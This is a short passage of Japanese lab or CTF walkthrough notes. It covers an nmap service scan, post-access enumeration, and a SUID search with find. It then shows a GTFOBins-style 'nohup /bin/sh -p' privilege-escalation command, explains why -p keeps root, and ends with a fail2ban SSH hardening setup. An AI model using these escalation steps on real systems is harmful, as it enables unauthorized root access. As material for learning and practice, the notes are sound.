...
- 各々ポートのサービスが何で動いている
- `sudo nmap -sV -p- $IP | tee nmap.log`
  - `22` openssh
  - `80` Apache httpd 2.4.29
  - `8080` BusyBox httpd 1.13
  - `8989` webfs httpd 1.21 <- シンプルな静的webserverのサービス
  - `9000` PHP cli server 
...
### 侵入
- `/opt`ディレクトリを調べる
- `.bash_history`を確認するが、/dev/nullに捨てている
- `ls /home`
- OSを特定する
- 個人で使える管理者権限を調べる
- ここから攻略1,2がある
...
- `find / -perm -u=s -type f 2> /dev/null`
  - `-tyep f`出力をファイルに限定するが、sはファイルなのであってもなくてもいいような、、 
...
- `nohup /bin/sh -p -c "sh -p < $(tty) > $(tty) 2> $(tty)"`
  - GTFOBinsのSUIDのところにも書いてある。ただし`sudo install ~`の行は打たなくていい
  - nohupコマンドはターミナルを閉じてもコマンドは継続して実行したいときに使うコマンド
  - suidファイルは実効ユーザ(root)と実ユーザ(user)が異なるのがポイント。-pは実ユーザ(ターミナルを起動したユーザ)と実効ユーザ(root)が異なる時につけるオプションで-pがない時は実ユーザになる。-pをつけると実効ユーザになるのでrootになることができる。
...
## root取得後
- sshからの失敗をbanする
- /etc/fail2ban/jail.localを開けて。次のを書く、passwordを2回失敗したら30秒間banされる
```
[sshd]
enabled = true
maxretry = 2
...
systemctl status fail2ban
```
- activeになっていれば実際にsshで間違ったパスワードを入力してみる。banされるが30秒経つとまたsshできる
